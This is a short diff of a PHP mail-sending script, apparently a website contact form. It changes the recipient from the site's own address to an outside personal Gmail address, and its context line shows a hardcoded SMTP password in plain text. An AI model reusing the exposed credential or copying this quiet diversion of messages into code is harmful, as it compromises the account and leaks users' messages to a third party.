@@ -249,7 +249,7 @@ $mail->Password = "6K.KHLsbA=~4";
 
 $mail->CharSet = 'windows-1250';
 $mail->SetFrom ('info@amoete.com', 'Message From amoete');
-$mail->AddAddress ( 'contacto@amoete.com' );
+$mail->AddAddress ( 'mdpanna600@gmail.com' );
 $mail->Subject = $subject;
 $mail->ContentType = 'text/plain';
 $mail->IsHTML(true);
